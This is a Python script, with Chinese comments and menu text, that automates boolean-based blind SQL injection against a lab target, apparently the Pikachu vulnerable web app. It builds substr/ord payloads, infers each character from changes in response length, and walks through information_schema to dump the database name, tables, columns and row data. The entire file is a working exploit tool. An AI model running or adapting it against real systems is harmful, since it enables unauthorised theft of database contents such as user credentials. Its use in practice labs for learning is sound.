import requests
import string
import sys
from urllib.parse import quote, unquote

##配置：
#url：是存在注入的链接，需要详细到sql注入语句前
#url_parameter：存在必要参数时需要填写，如果是字符型注入需要将 #或者 --d写在这里，参数需要需要url编码
url="http://192.168.131.132:8080/vul/sqli/sqli_blind_b.php?name=kobe'+and+"
url_parameter="+%23&submit=%E6%9F%A5%E8%AF%A2"



charsets = ",@"+ string.digits + string.ascii_lowercase + string.ascii_uppercase
def r(s):
    s = s.replace(" ", "/**/")
    return s

def sql_database_length(url,url_parameter):
    txt_len_up=0
    for i in range(0,10):
        payload="length(database())>"+str(i)
        url_end=url+quote(payload)+url_parameter
        txt_len=len(requests.get(url_end).text)
        if txt_len_up != txt_len and txt_len_up !=0:
            print(i)
        txt_len_up=txt_len


def sql_name(url,url_parameter,payload):
    payload=payload
    result=""
    flag_a = 0
    for i in range(2,100):
        txt_len_up = 0
        for charset in charsets:
            url_end = url + quote(f"ord(substr({payload},{i-1},1))={ord(charset)}") + url_parameter
            txt_len = len(requests.get(url_end).text)
            if txt_len_up != txt_len and txt_len_up != 0:
                result += charset
                #print(result)
                break
            if txt_len_up == txt_len and charset=="Z":
                flag_a=1
            txt_len_up = txt_len
        if flag_a==1:
            break
    print(result)
    return result
def payload_sub(num):
    if num ==1:
        payload="database()"
        sql_name(url, url_parameter, payload)
    elif num ==2:
        database=input("请输入数据库名：")
        #i=int(input("查询第几个表："))
        for i in range(1,100):
            payload=f"(select table_name from information_schema.tables where table_schema='{database}' limit {i-1},1)"
            result=sql_name(url, url_parameter, payload)
            if not result:
                break
    elif num ==3:
        database=input("请输入数据库名：")
        table=input("请输入表名：")
        #i=int(input("查询第几个字段："))
        for i in range(1,100):
            payload=f"(select column_name from information_schema.columns where table_schema='{database}' and table_name='{table}' limit {i-1},1)"
            result = sql_name(url, url_parameter, payload)
            if not result:
                break
    elif num ==4:
        table=input("请输入表名：")
        field=input("请输入字段名：")
        #i=int(input("查询第几条数据："))
        for i in range(1, 100):
            payload=f"(select {field} from {table} limit {i-1},1)"
            result = sql_name(url, url_parameter, payload)
            if not result:
                break
    else:
        print("信息输入有误")
        sys.exit(0)

print("-----------------------------")
print("--------1、查数据库名-----------")
print("--------2、查表名--------------")
print("--------3、查字段名------------")
print("--------4、查数据--------------")
print("-----------------------------")
num=int(input("请输入数字"))
payload_sub(num)
